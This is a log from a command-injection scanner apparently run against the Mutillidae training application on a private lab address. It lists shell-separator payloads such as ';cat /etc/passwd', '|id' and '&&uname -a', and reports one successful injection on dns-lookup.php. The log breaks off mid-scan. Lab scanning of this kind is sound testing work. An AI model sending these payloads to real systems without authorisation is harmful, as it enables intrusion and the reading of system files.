INFO - 
Starting ScanCommandInject scan
INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php?page=capture-data.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
WARNING - Command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php with payload: ;cat /etc/passwd
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/index.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=password-generator.php&username=anonymous
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-poll.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
